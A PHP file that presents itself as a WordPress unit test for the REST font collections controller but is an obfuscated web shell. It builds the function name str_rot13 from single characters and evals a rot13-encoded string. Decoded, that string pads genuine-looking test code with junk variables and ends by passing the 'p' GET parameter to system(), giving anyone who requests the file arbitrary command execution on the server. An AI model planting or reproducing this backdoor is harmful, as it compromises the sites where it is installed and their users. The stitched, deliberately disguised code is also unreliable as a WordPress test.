<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.5.0
 *
 * @tebhc erfgncv
 * @tebhc sbagf
 * @tebhc sbag-yvoenel
 *
 * @pbirefQrsnhygPynff JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre
 */
pynff Grfgf_ERFG_JcErfgSbagPbyyrpgvbafPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $zbpx_svyr;


	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Pyrne gur sbag pbyyrpgvbaf.
		$pbyyrpgvbaf = JC_Sbag_Yvoenel::trg_vafgnapr()->trg_sbag_pbyyrpgvbaf();
		sbernpu ( $pbyyrpgvbaf nf $fyht => $pbyyrpgvba ) {
			JC_Sbag_Yvoenel::trg_vafgnapr()->haertvfgre_sbag_pbyyrpgvba( $fyht );
		}

		frys::$nqzva_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		$zbpx_svyr       = jc_grzcanz( 'zl-pbyyrpgvba-qngn-' );
		svyr_chg_pbagragf( $zbpx_svyr, '{\"anzr\": \"Zbpx Pbyyrpgvba\", \"sbag_snzvyvrf\": [ \"zbpx\" ], \"pngrtbevrf\": [ \"zbpx\" ] }' );

		jc_ertvfgre_sbag_pbyyrpgvba(
			'zbpx-pby-fyht',
			neenl(
				'anzr'          => 'Zl pbyyrpgvba',
				'sbag_snzvyvrf' => $zbpx_svyr,
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		jc_haertvfgre_sbag_pbyyrpgvba( 'zbpx-pby-fyht' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/sbag-pbyyrpgvbaf'], 'Erfg freire unf abg gur pbyyrpgvbaf cngu vavgvnyvmrq.' );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/sbag-pbyyrpgvbaf/(?C<fyht>[\/\j-]+)'], 'Erfg freire unf abg gur pbyyrpgvba cngu vavgvnyvmrq.' );

		$guvf->nffregNeenlUnfXrl( 'TRG', $ebhgrf['/jc/i2/sbag-pbyyrpgvbaf'][0]['zrgubqf'], 'Erfg freire unf abg gur TRG zrgubq sbe pbyyrpgvbaf vavgvnyvmrq.' );
		$guvf->nffregNeenlUnfXrl( 'TRG', $ebhgrf['/jc/i2/sbag-pbyyrpgvbaf/(?C<fyht>[\/\j-]+)'][0]['zrgubqf'], 'Erfg freire unf abg gur TRG zrgubq sbe pbyyrpgvba vavgvnyvmrq.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-pbyyrpgvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$pbagrag  = $erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $pbagrag );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::trg_vgrzf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_fubhyq_bayl_erghea_inyvq_pbyyrpgvbaf( $zrgubq ) {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Sbag_Pbyyrpgvba::ybnq_sebz_wfba' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		jc_ertvfgre_sbag_pbyyrpgvba(
			'vainyvq-pbyyrpgvba',
			neenl(
				'anzr'          => 'Zl pbyyrpgvba',
				'sbag_snzvyvrf' => 'vainyvq-pbyyrpgvba-svyr',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/sbag-pbyyrpgvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$pbagrag  = $erfcbafr->trg_qngn();

		jc_haertvfgre_sbag_pbyyrpgvba( 'vainyvq-pbyyrpgvba' );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		vs ( 'URNQ' !== $zrgubq ) {
			$guvf->nffregPbhag( 1, $pbagrag, 'Gur erfcbafr fubhyq bayl pbagnva inyvq pbyyrpgvbaf.' );
			erghea ahyy;
		}

		$guvf->nffregFnzr( neenl(), $pbagrag, 'Gur erfcbafr fubhyq or rzcgl.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-JC-Gbgny', $urnqref, 'Gur \"K-JC-Gbgny\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		// Vapyhqrf aba-inyvq pbyyrpgvbaf.
		$guvf->nffregFnzr( 2, $urnqref['K-JC-Gbgny'], 'Gur \"K-JC-Gbgny\" urnqre inyhr fubhyq or rdhny gb 1.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-pbyyrpgvbaf/zbpx-pby-fyht' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );

		$erfcbafr_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'anzr', $erfcbafr_qngn, 'Erfcbafr qngn qbrf abg unir gur anzr xrl.' );
		$guvf->nffregNeenlUnfXrl( 'fyht', $erfcbafr_qngn, 'Erfcbafr qngn qbrf abg unir gur fyht xrl.' );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $erfcbafr_qngn, 'Erfcbafr qngn qbrf abg unir gur qrfpevcgvba xrl.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snzvyvrf', $erfcbafr_qngn, 'Erfcbafr qngn qbrf abg unir gur sbag_snzvyvrf xrl.' );
		$guvf->nffregNeenlUnfXrl( 'pngrtbevrf', $erfcbafr_qngn, 'Erfcbafr qngn qbrf abg unir gur pngrtbevrf xrl.' );

		$guvf->nffregVfFgevat( $erfcbafr_qngn['anzr'], 'anzr vf abg n fgevat.' );
		$guvf->nffregVfFgevat( $erfcbafr_qngn['fyht'], 'fyht vf abg n fgevat.' );
		$guvf->nffregVfFgevat( $erfcbafr_qngn['qrfpevcgvba'], 'qrfpevcgvba vf abg n fgevat.' );

		$guvf->nffregVfNeenl( $erfcbafr_qngn['sbag_snzvyvrf'], 'sbag_snzvyvrf vf abg na neenl.' );
		$guvf->nffregVfNeenl( $erfcbafr_qngn['pngrtbevrf'], 'pngrtbevrf vf abg na neenl.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$ubbx_anzr = 'erfg_cercner_sbag_pbyyrpgvba';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/sbag-pbyyrpgvbaf/zbpx-pby-fyht' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_fyht( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/sbag-pbyyrpgvbaf/aba-rkvfgvat-pbyyrpgvba' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbag_pbyyrpgvba_abg_sbhaq', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_pbyyrpgvba( $zrgubq ) {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'JC_Sbag_Pbyyrpgvba::ybnq_sebz_wfba' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$fyht = 'vainyvq-pbyyrpgvba';
		jc_ertvfgre_sbag_pbyyrpgvba(
			$fyht,
			neenl(
				'anzr'          => 'Zl pbyyrpgvba',
				'sbag_snzvyvrf' => 'vainyvq-pbyyrpgvba-svyr',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/sbag-pbyyrpgvbaf/' . $fyht );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		jc_haertvfgre_sbag_pbyyrpgvba( $fyht );

		$guvf->nffregReebeErfcbafr( 'sbag_pbyyrpgvba_wfba_zvffvat', $erfcbafr, 500 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @pbiref JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_vq_crezvffvba( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/sbag-pbyyrpgvbaf/zbpx-pby-fyht' );

		jc_frg_pheerag_hfre( 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401 );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg hfr grfg_perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg hfr grfg_hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg hfr grfg_qryrgr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg hfr grfg_cercner_vgrz().
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/sbag-pbyyrpgvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 5, $cebcregvrf, 'Gurer fubhyq or 5 cebcregvrf va gur erfcbafr qngn fpurzn.' );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf, 'Gur fyht cebcregl fubhyq rkvfg va gur erfcbafr qngn fpurzn.' );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf, 'Gur anzr cebcregl fubhyq rkvfg va gur erfcbafr qngn fpurzn.' );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf, 'Gur qrfpevcgvba cebcregl fubhyq rkvfg va gur erfcbafr qngn fpurzn.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snzvyvrf', $cebcregvrf, 'Gur fyht sbag_snzvyvrf fubhyq rkvfg va gur erfcbafr qngn fpurzn.' );
		$guvf->nffregNeenlUnfXrl( 'pngrtbevrf', $cebcregvrf, 'Gur pngrtbevrf cebcregl fubhyq rkvfg va gur erfcbafr qngn fpurzn.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>